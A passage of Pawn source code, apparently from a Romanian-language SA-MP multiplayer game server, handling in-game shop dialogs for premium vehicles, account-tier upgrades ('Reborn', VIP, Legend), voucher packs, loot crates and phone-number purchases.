				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Bullet [PREMIUM]. (-2000 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 2000; ServerStock[3]--;
				            GiveVehicle(playerid, 541, true);
							format(string, sizeof(string), "%s si-a achizitionat un Bullet Premium pentru 2000 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
						}
						case 11: {
				    		if(!ServerStock[4]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Stoc epuizat!");
				    		if(PlayerInfo[playerid][pPremiumPoints] < 1000) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Sultan [PREMIUM]. (-1000 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 1000; ServerStock[4]--;
				            GiveVehicle(playerid, 560, true);
							format(string, sizeof(string), "%s si-a achizitionat un Sultan Premium pentru 1000 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
						}
						case 12: {
				    		if(!ServerStock[5]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Stoc epuizat!");
				    		if(PlayerInfo[playerid][pPremiumPoints] < 869) return SendClientMessage(playerid, -1, "Nu ai punctele premium necesare pentru a cumpara acest produs.");
				            if(Iter_Count(MyVehicle<playerid>) >= GetVehicleSlots(playerid)) return SendClientMessage(playerid, -1, "Nu ai un slot liber!");
		              		SendClientMessage(playerid, COLOR_GREEN, "(SHOP INFO){D7FFB3} Felicitari! Ti-ai cumparat un Turismo [PREMIUM]. (-869 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 869; ServerStock[5]--;
				            GiveVehicle(playerid, 451, true);
							format(string, sizeof(string), "%s si-a achizitionat un Turismo Premium pentru 869 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
						}
				    }
				    UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
				}
				case 3: {
		    		switch(SelectedItem[playerid]) {
			        	case 0: {
			        		if(PlayerInfo[playerid][pPremiumPoints] < 1000) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
			        		if(PlayerInfo[playerid][pVip]>1&&PlayerInfo[playerid][pPremiumAccount]>1)
			        			return ShowPlayerDialog(playerid, DIALOG_CONFIRM, DIALOG_STYLE_MSGBOX, "Shop Info", "Esti SIGUR ca vrei sa cumperi acest packet?\nAi deja unul dintre aceste produse si nu-l vei primi.", "Da", "Nu");
				        }
				   		case 1: {
				   			if(PlayerInfo[playerid][pPremiumPoints] < 850) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
		              		SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Ai achizitionat packetul Voucher si ai primit: 1x Legendary, 2x Epic, 3x Rare (vouchers). (-850 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 850;
				            PlayerInfo[playerid][pVoucher][0] += 3;
				            PlayerInfo[playerid][pVoucher][1] += 2;
				            PlayerInfo[playerid][pVoucher][2] ++;
							format(string, sizeof(string), "%s si-a achizitionat un Voucher Pack pentru suma de 850 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							save_vouchers(playerid);
				        }
				        case 2: {
				        	if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
		              		SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Ai achizitionat packetul Vehicle si ai primit: Hotring Racer, 4x Hidden Colors, 1x Slot. (-500 premium points)");
				            PlayerInfo[playerid][pPremiumPoints] -= 500;
				            PlayerInfo[playerid][pHidden] += 4;
				            UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);

				        	if(PlayerInfo[playerid][pSlot] < MAX_PLAYER_VEHICLE) 
				        		PlayerInfo[playerid][pSlot] ++, UpdateVar(playerid, "Slot", PlayerInfo[playerid][pSlot]);
							
							format(string, sizeof(string), "%s si-a achizitionat un Vehicle Pack pentru 500 Premium Points.", GetName(playerid));
							InsertLog(playerid, string, LOG_SHOP);
							if(Iter_Count(MyVehicle<playerid>) != GetVehicleSlots(playerid)) {
								ShowPlayerDialog(playerid, DIALOG_SHOPMENU1, DIALOG_STYLE_LIST, "Vehicle Pack", "Hotring Race A\nHotring Race B\nHotring Race C", "Select", "");
								SendClientMessage(playerid, COLOR_RED, "Eroare: {FFFFFF}Ai numarul maxim de sloturi!");
							}
				        }				
					}
					UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
				}
				case 5: {
					switch(SelectedItem[playerid]) {
						case 0: {
							if(PlayerInfo[playerid][pReborn]>=1)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu mai poti upgrada contul la gradul de 'Reborn' deoarece ai mai facut o data asta!");

							if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");

							if(PlayerInfo[playerid][pLevel] < 100) 
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai minim level 100!");

							if(PlayerInfo[playerid][pExp] < 500)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente RP-uri!");

							if(PlayerInfo[playerid][pBPoints] < 3000) 
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente BPoints!");

							SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Felicitari! Ai upgradat contul la 'Reborn'. (-500pp / 500 rp / 3000bp)");
							PlayerInfo[playerid][pExp] -= 500;
							PlayerInfo[playerid][pPremiumPoints] -= 500;
							PlayerInfo[playerid][pLevel] = 3;
							PlayerInfo[playerid][pBPoints] -= 3000;
							SetPlayerScore(playerid, 3);

							PlayerInfo[playerid][pReborn] = 1;
							update_head_label(playerid);

							gQuery[0] = (EOS);
							mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Respect` = '%i', `Level` = '3', `GoldPoints` = '%i', `BPoints` = '%i', `Reborn` = '1' WHERE `id` = '%i'", PlayerInfo[playerid][pExp], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, gQuery);
						}//reborn
						case 1: {
							if(PlayerInfo[playerid][pReborn]>=2)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu mai poti upgrada contul la gradul de 'Reborn 2' deoarece ai mai facut o data asta!");
							if(PlayerInfo[playerid][pReborn]!=1)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a lua acest grad trebuie sa achizitionezi mai intai reborn 1!");

							if(PlayerInfo[playerid][pLevel] < 100) 
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai minim level 100!");

							if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");

							if(PlayerInfo[playerid][pExp] < 400)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente RP-uri!");

							if(PlayerInfo[playerid][pBPoints] < 5000)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente BPoints!");

							SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Felicitari! Ai upgradat contul la 'Reborn 2'. (-500pp / 400 rp / 5000bp)");
							PlayerInfo[playerid][pExp] -= 400;
							PlayerInfo[playerid][pPremiumPoints] -= 500;
							PlayerInfo[playerid][pLevel] = 3;
							PlayerInfo[playerid][pBPoints] -= 5000;
							SetPlayerScore(playerid, 3);

							PlayerInfo[playerid][pReborn] = 2;
							update_head_label(playerid);

							gQuery[0] = (EOS);
							mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Respect` = '%i', `BPoints` = '%i', `Level` = '3', `GoldPoints` = '%i', `Reborn` = '2' WHERE `id` = '%i'", PlayerInfo[playerid][pExp], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, gQuery);
						}//reborn 2
						case 2: {
							if(PlayerInfo[playerid][pReborn]>=3)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu mai poti upgrada contul la gradul de 'Reborn 3' deoarece ai mai facut o data asta!");
							if(PlayerInfo[playerid][pReborn]!=2)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a lua acest grad trebuie sa achizitionezi mai intai reborn 2!");

							if(PlayerInfo[playerid][pLevel] < 100) 
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai minim level 100!");

							if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");

							if(PlayerInfo[playerid][pExp] < 300)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente RP-uri!");

							if(PlayerInfo[playerid][pBPoints] < 8000)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente BPoints!");

							SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Felicitari! Ai upgradat contul la 'Reborn 3'. (-500pp / 300 rp / 8000bp)");
							PlayerInfo[playerid][pExp] -= 300;
							PlayerInfo[playerid][pPremiumPoints] -= 500;
							PlayerInfo[playerid][pLevel] = 3;
							PlayerInfo[playerid][pBPoints] -= 8000;
							PlayerInfo[playerid][pSlot] += 5;
							SetPlayerScore(playerid, 3);

							PlayerInfo[playerid][pReborn] = 3;
							update_head_label(playerid);

							gQuery[0] = (EOS);
							mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Respect` = '%i', `BPoints` = '%i', `Level` = '3', `GoldPoints` = '%i', `Reborn` = '3' WHERE `id` = '%i'", PlayerInfo[playerid][pExp], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, gQuery);
						}//reborn 3
						case 3: {
							if(PlayerInfo[playerid][pReborn]>=4)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu mai poti upgrada contul la gradul de 'Reborn 4' deoarece ai mai facut o data asta!");
							if(PlayerInfo[playerid][pReborn]!=3)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a lua acest grad trebuie sa achizitionezi mai intai reborn 3!");

							if(PlayerInfo[playerid][pLevel] < 100) 
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai minim level 100!");

							if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");

							if(PlayerInfo[playerid][pExp] < 200)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente RP-uri!");

							if(PlayerInfo[playerid][pBPoints] < 10000)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente BPoints!");

							SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Felicitari! Ai upgradat contul la 'Reborn 4'. (-500pp / 200 rp / 10000bp)");
							PlayerInfo[playerid][pExp] -= 200;
							PlayerInfo[playerid][pPremiumPoints] -= 500;
							PlayerInfo[playerid][pLevel] = 3;
							PlayerInfo[playerid][pBPoints] -= 10000;
							PlayerInfo[playerid][pSlot] += 5;
							SetPlayerScore(playerid, 3);

							PlayerInfo[playerid][pReborn] = 4;
							update_head_label(playerid);

							gQuery[0] = (EOS);
							mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Respect` = '%i', `BPoints` = '%i', `Level` = '3', `GoldPoints` = '%i', `Reborn` = '4' WHERE `id` = '%i'", PlayerInfo[playerid][pExp], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, gQuery);
						}//reborn 4
						case 4: {
							if(PlayerInfo[playerid][pReborn]>=5)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu mai poti upgrada contul la gradul de 'Reborn 5' deoarece ai mai facut o data asta!");
							if(PlayerInfo[playerid][pReborn]!=4)
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a lua acest grad trebuie sa achizitionezi mai intai reborn 4!");

							if(PlayerInfo[playerid][pLevel] < 100) 
								return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai minim level 100!");

							if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");

							if(PlayerInfo[playerid][pExp] < 100)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente RP-uri!");

							if(PlayerInfo[playerid][pBPoints] < 15000)
								return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficiente BPoints!");

							SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Felicitari! Ai upgradat contul la 'Reborn 5'. (-500pp / 100 rp / 15000bp)");
							PlayerInfo[playerid][pExp] -= 100;
							PlayerInfo[playerid][pPremiumPoints] -= 500;
							PlayerInfo[playerid][pLevel] = 3;
							PlayerInfo[playerid][pBPoints] -= 15000;
							PlayerInfo[playerid][pSlot] += 5;
							SetPlayerScore(playerid, 3);

							PlayerInfo[playerid][pReborn] = 5;
							update_head_label(playerid);

							gQuery[0] = (EOS);
							mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Respect` = '%i', `BPoints` = '%i', `Level` = '3', `GoldPoints` = '%i', `Reborn` = '5' WHERE `id` = '%i'", PlayerInfo[playerid][pExp], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, gQuery);
						}//reborn 5
						case 5: {
							if(PlayerInfo[playerid][pPremiumPoints] < 150) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
				            if(PlayerInfo[playerid][pPremiumAccount]) return SendClientMessage(playerid, -1, "Contul tau deja este Premium.");
		              		SendClientMessage(playerid, -1, "{47A033}(SHOP INFO){D7FFB3} Felicitari! Contul tau este acum unul de tip Premium. (-150 premium points)");
				            PlayerInfo[playerid][pPremiumAccount] = 1;
				            UpdateVar(playerid, "Premium", 1);
				            PlayerInfo[playerid][pSlot] += 2;
				            UpdateVar(playerid, "Slot", PlayerInfo[playerid][pSlot]);
				            PlayerInfo[playerid][pPremiumPoints]-=150;
							format(gQuery, 128, "%s si-a achizitionat cont premium pentru 150 Premium Points.", GetName(playerid));
							InsertLog(playerid, gQuery, LOG_SHOP);
							Iter_Add(PlayerPremiums, playerid);
				        }
						case 6: {
							if(!PlayerInfo[playerid][pPremiumAccount]) return SendClientMessage(playerid, -1, "Ai nevoie de cont premium.");
				            if(PlayerInfo[playerid][pPremiumAccount] > 1) return SendClientMessage(playerid, -1, "Contul tau deja este Premium PLUS!");
				            if(ByteVar1@money[playerid] < eBit:2 || PlayerInfo[playerid][pBPoints] < 5000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de 2 miliarde si 5000 BPoints.");
		              		SendClientMessage(playerid, -1, "{47A033}(SHOP INFO){D7FFB3} Felicitari! Contul tau este acum unul de tip Premium Plus. (-2 miliards & -5000 BPoints)");
				            PlayerInfo[playerid][pPremiumAccount] = 2;
				            UpdateVar(playerid, "Premium", 2);
				          	ByteVar1@money[playerid]-=eBit:2;
				          	PlayerInfo[playerid][pBPoints] -= 5000;
				          	UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
							format(gQuery, 128, "%s si-a achizitionat cont premium plus pentru 2 miliards & 5000 BPoints.", GetName(playerid));
							InsertLog(playerid, gQuery, LOG_SHOP);
				    	}
				    	case 7: {
				    		if(PlayerInfo[playerid][pPremiumPoints] < 800) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							if(PlayerInfo[playerid][pVip]) return SendClientMessage(playerid, -1, "Ai deja cont VIP.");
							PlayerInfo[playerid][pVip]++;
							PlayerInfo[playerid][pBackpack] = 1;
							PlayerInfo[playerid][pBackpackLevel] = 1;
							Iter_Add(PlayerVips<NORMAL>, playerid);
							SetPlayerAttachedObject( playerid, 8, 3026, 1, -0.172813, -0.112569, -0.022387, 0.000000, 0.000000, 3.390071, 1.000000, 1.000000, 1.130721);
							UpdateVar(playerid, "Vip", 1);
							UpdateVar(playerid, "Backpack", 1);
							UpdateVar(playerid, "BackpackLevel", 1);
							SendClientMessage(playerid, -1, "{47A033}(SHOP INFO){D7FFB3} Felicitari! Contul tau este acum unul de tip VIP (-800 premium points)");
							PlayerInfo[playerid][pPremiumPoints] -= 800;
							update_head_label(playerid);
							format(gString, 128, "%s si-a achizitionat un cont VIP pentru 800 Premium Points.", GetName(playerid));
							InsertLog(playerid, gString, LOG_SHOP);						
						}	
						case 8: {
							if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							if(!PlayerInfo[playerid][pVip]) return SendClientMessage(playerid, -1, "Ai nevoie de cont VIP.");
							if(PlayerInfo[playerid][pVip]>1) return SendClientMessage(playerid, -1, "Ai deja cont VIP Plus.");
							PlayerInfo[playerid][pVip]++;
							UpdateVar(playerid, "Vip", 2);
							SendClientMessage(playerid, -1, "{47A033}(SHOP INFO){D7FFB3} Felicitari! Contul tau este acum unul de tip VIP Plus (-500 premium points)");
							PlayerInfo[playerid][pPremiumPoints] -= 500;
							update_head_label(playerid);
							format(gString, 128, "%s si-a achizitionat un cont VIP Plus pentru 500 Premium Points.", GetName(playerid));
							InsertLog(playerid, gString, LOG_SHOP);	
							ShowPlayerDialog(playerid, DIALOG_NEWNUMBER, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti achizitonezi un iPhone (3 cifre, bonus VIP Plus)\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un numar format din 3 cifre.", "Select", "");					
						}
						case 9: {
							if(PlayerInfo[playerid][pPremiumPoints] < 1337) return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have premium points to do this.", "Close", "");
							switch(PlayerInfo[playerid][pVip]) {
								case 0,1: return SendClientMessage(playerid, -1, "Ai nevoie de cont VIP Plus.");
								case 3: return SendClientMessage(playerid, -1, "Ai deja cont LEGEND!");
							}
							PlayerInfo[playerid][pVip] = 3;
							UpdateVar(playerid, "Vip", 3);
							SendClientMessage(playerid, -1, "{47a033}(SHOP INFO) {D7FFB3}Felicitari! Contul tau este acum unul de tip Legend. (-1337 premium points)");
							PlayerInfo[playerid][pPremiumPoints] -= 1337;
							update_head_label(playerid);
							Iter_Remove(PlayerVips<NORMAL>, playerid);
							Iter_Add(PlayerVips<LEGEND>, playerid);
							format(gString, 128, "%s si-a achizitionat un cont Legend pentru 1337 Premium Points.", GetName(playerid));
							InsertLog(playerid, gString, LOG_SHOP);		
							strmid(PlayerInfo[playerid][pPhone], "In Process", 0, 30);
							UpdateVarStr(playerid, "PhoneNr", "In Process");
							SetGVarInt(PlayerInfo[playerid][pPhone], playerid+1);
						}
				    }
				    UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
				}
		    }
		}
		case DIALOG_SHOPMENU1: {
			if(!response) return ShowPlayerDialog(playerid, DIALOG_SHOPMENU1, DIALOG_STYLE_LIST, "Vehicle Pack", "Hotring Race A\nHotring Race B\nHotring Race C", "Select", "");
			switch(listitem) {
				case 0: GiveVehicle(playerid, 502);
				case 1: GiveVehicle(playerid, 503);
				case 2: GiveVehicle(playerid, 494);
			}
		}
		case DIALOG_VOUCHERS: {
			if(!response) return true;
			if(PlayerInfo[playerid][pVoucher][listitem] <= 0) return SendClientMessage(playerid, COLOR_GREY, "Eroare: {FFFFFF}Nu ai un voucher de acest tip!");
			PlayerInfo[playerid][pVoucher][listitem] --;
			switch(listitem) {
				case 0: {
					PlayerInfo[playerid][pPremiumPoints] += 50;
					SendClientMessage(playerid, COLOR_LIGHTGREEN, "Vouchers: {FFFFFF}Ai deschis un Rare Voucher si ai primit 50 Premium Points.");
				}
				case 1: {
					PlayerInfo[playerid][pPremiumPoints] += 100;
					SendClientMessage(playerid, COLOR_LIGHTGREEN, "Vouchers: {FFFFFF}Ai deschis un Epic Voucher si ai primit 100 Premium Points.");
				}
				case 2: {
					PlayerInfo[playerid][pPremiumPoints] += 500;
					SendClientMessage(playerid, COLOR_LIGHTGREEN, "Vouchers: {FFFFFF}Ai deschis un Legendary Voucher si ai primit 500 Premium Points.");
				}
				case 3: {
					PlayerInfo[playerid][pPremiumPoints] += 250;
					SendClientMessage(playerid, COLOR_LIGHTGREEN, "Vouchers: {FFFFFF}Ai deschis un mythic Voucher si ai primit 250 Premium Points.");
				}
				case 4: {
					PlayerInfo[playerid][pPremiumPoints] += 1000;
					SendClientMessage(playerid, COLOR_LIGHTGREEN, "Vouchers: {FFFFFF}Ai deschis un Millionaries Voucher si ai primit 1000 Premium Points.");
				}
			}
			save_vouchers(playerid);
			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
		}
		case DIALOG_BUYCRATES: {
			if(!response) 
				return true;

			new x=AlegeCrates[playerid];
			switch(x) {
				case 6: strcat(gString, "Payment type\tAmount\nMoney\t{1bcc82}$499,000,000");
				case 8: strcat(gString, "Payment type\tAmount\nPremium Points\t{FFFF00}325");
				case 9: strcat(gString, "Payment type\tAmount\nPremium Points\t{FFFF00}425");
				default: format(gString, 128, "Payment type\tAmount\nB-HOOD Points\t{D373FF}%d\nPremium Points\t{FFFF00}%d", CratePrice[x][0], CratePrice[x][1]);
			}
			new title[50];
			format(title, 50, "Buy Crate (%s)", CrateName[x][confirm]);
			ShowPlayerDialog(playerid, DIALOG_BUYCRATES1, DIALOG_STYLE_TABLIST_HEADERS, title, gString, "Select", "Cancel");
		}
		case DIALOG_BUYCRATES1: {
			if(!response) return true;
			new x = AlegeCrates[playerid];
			switch(x) {
				case 5: {
					if(ServerStock[6]<=0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Stoc epuizat!");
					switch(listitem) {
						case 0: {
							if(PlayerInfo[playerid][pBPoints] < CratePrice[x][0]) return SendClientMessage(playerid, -1, "Nu ai suficiente BPoints");
							PlayerInfo[playerid][pBPoints] -= CratePrice[x][0];
							format(gString, 132, "(Crate System){FFFFFF} Ti-ai cumparat o cutie (vehicle) pentru {E26AF2}%d BPoints{FFFFFF}! Total cutii rare: %d [%d total - general]", CratePrice[x][0], PlayerInfo[playerid][pCrates][x]+1, totalcrates(playerid)+1);
						}
						case 1: {
							if(PlayerInfo[playerid][pPremiumPoints] < CratePrice[x][1]) return SendClientMessage(playerid, -1, "Nu ai suficiente puncte premium.");
							PlayerInfo[playerid][pPremiumPoints] -= CratePrice[x][1];
							format(gString, 132, "(Crate System) {FFFFFF}Ti-ai cumparat o cutie (vehicle) pentru {FFFF00}%d puncte premium{FFFFFF}! Total cutii: %d [%d total - general]", CratePrice[x][1], PlayerInfo[playerid][pCrates][x]+1, totalcrates(playerid)+1);		
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
						}
						default: return true;
					}
					ServerStock[6]--;
					format(gQuery, 256, "{FF7A7A}(stock: %d)\n{7556FF}Vehicle crate\n{FFFFFF}Use {7556FF}/buycrate {FFFFFF}to buy this crate\nCrate Price: {7556FF}5000 BPoints {FFFFFF}/ {7556FF}300 premium points", ServerStock[6]);
					UpdateDynamic3DTextLabelText(LabelCrates, -1, gQuery);					
				}
				case 6: {
					if(GetPlayerCash(playerid) < 499000000) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, " ", "Nu ai $499,000,000!", "Close", "");
					GivePlayerCash(playerid, -499000000);
					format(gString, 132, "(Crate System) {FFFFFF}Ti-ai cumparat o cutie (emote) pentru {1bcc82}$499,000,000{FFFFFF}! Total cutii: %d [%d total - general]", PlayerInfo[playerid][pCrates][x]+1, totalcrates(playerid)+1);			
				}
				case 8: {
					if(ServerStock[7]<=0) return SendClientMessage(playerid, COLOR_LGREEN, "PREMIUM CRATE: Stoc epuizat!");
					if(PlayerInfo[playerid][pPremiumPoints] < CratePrice[x][1]) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, " ", "Nu ai suficiente puncte premium!", "Close", "");
					PlayerInfo[playerid][pPremiumPoints] -= CratePrice[x][1];
					format(gString, 132, "(Crate System) {FFFFFF}Ti-ai cumparat o cutie (premium) pentru {FFFF00}350 puncte premium{FFFFFF}! Total cutii: %d [%d total - general]", PlayerInfo[playerid][pCrates][x]+1, totalcrates(playerid)+1);		
					UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
					ServerStock[7]--;
					format(gQuery, 256, "{FF7A7A}(stock: %d)\n{77FF00}Premium crate\n{FFFFFF}Use {77FF00}/buycrate {FFFFFF}to buy this crate\nCrate Price: {77FF00}350 premium points", ServerStock[7]);
					UpdateDynamic3DTextLabelText(LabelCrates1, -1, gQuery);			
				}
				case 9: {
					if(ServerStock[8]<=0) return SendClientMessage(playerid, COLOR_LGREEN, "PREMIUM CRATE: Stoc epuizat!");
					if(PlayerInfo[playerid][pPremiumPoints] < CratePrice[x][1]) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, " ", "Nu ai suficiente puncte premium!", "Close", "");
					PlayerInfo[playerid][pPremiumPoints] -= CratePrice[x][1];
					format(gString, 132, "(Crate System) {FFFFFF}Ti-ai cumparat o cutie (premium v2) pentru {FFFF00}425 puncte premium{FFFFFF}! Total cutii: %d [%d total - general]", PlayerInfo[playerid][pCrates][x]+1, totalcrates(playerid)+1);		
					UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
					ServerStock[8]--;
					format(gQuery, 256, "{FF7A7A}(stock: %d)\n{77FF00}Premium crate V2\n{FFFFFF}Use {77FF00}/buycrate {FFFFFF}to buy this crate\nCrate Price: {77FF00}425 premium points", ServerStock[8]);
					UpdateDynamic3DTextLabelText(LabelCrates2, -1, gQuery);			
				}
				default: {
					switch(listitem) {
						case 0: {
							if(PlayerInfo[playerid][pBPoints] < CratePrice[x][0]) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, " ", "Nu ai suficiente bPoints!", "Close", "");
							PlayerInfo[playerid][pBPoints] -= CratePrice[x][0];
							format(gString, 132, "(Crate System) {FFFFFF}Ti-ai cumparat o cutie %s pentru {D373FF}%d bPoints{FFFFFF}! Total cutii: %d [%d total - general]", CrateName[x][short], CratePrice[x][0], PlayerInfo[playerid][pCrates][x]+1, totalcrates(playerid)+1);
						}
						case 1: {
							if(PlayerInfo[playerid][pPremiumPoints] < CratePrice[x][1]) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, " ", "Nu ai suficiente puncte premium!", "Close", "");
							PlayerInfo[playerid][pPremiumPoints] -= CratePrice[x][1];
							format(gString, 132, "(Crate System) {FFFFFF}Ti-ai cumparat o cutie %s pentru {FFFF00}%d puncte premium{FFFFFF}! Total cutii: %d [%d total - general]", CrateName[x][short], CratePrice[x][1], PlayerInfo[playerid][pCrates][x]+1, totalcrates(playerid)+1);		
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
						}
						default: return true;
					}
				}	
			}
			SendClientMessage(playerid, 0xc2a2daFF, gString);	
			SendClientMessage(playerid, -1, "Pentru a deschide o cutie, foloseste /opencrate.");
			PlayerInfo[playerid][pCrates][x] ++;
			save_crates(playerid);
		}
		case DIALOG_IPHONE: {
		    if(!response) return ShowShop(playerid);
		    if(ShopType[playerid] != 3) {
		    	if(PlayerInfo[playerid][pPremiumPoints] < 20) return SendClientMessage(playerid, COLOR_WHITE, "Ai nevoie de 20 Premium Points pentru a lua acest produs.");
		    }
			if(strlen(inputtext) != 4 || strval(inputtext) < 1000) {
	 			SendClientMessage(playerid, -1, "Numarul trebuie sa fie format din 4 cifre si sa inceapa de la 1000.");
				ShowPlayerDialog(playerid, DIALOG_IPHONE, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti {5F9CC9}achizitionezi un iPhone{FFFFFF}.\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un numar format din 4 cifre.", "Ok", "Back");
				return true;
	 		}
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `PhoneNr`='%d' LIMIT 1", strval(inputtext));
			mysql_tquery(SQL, gQuery, "sql_check_phone_", "ii", playerid, strval(inputtext));
		}		
		case DIALOG_NEWNUMBER: {
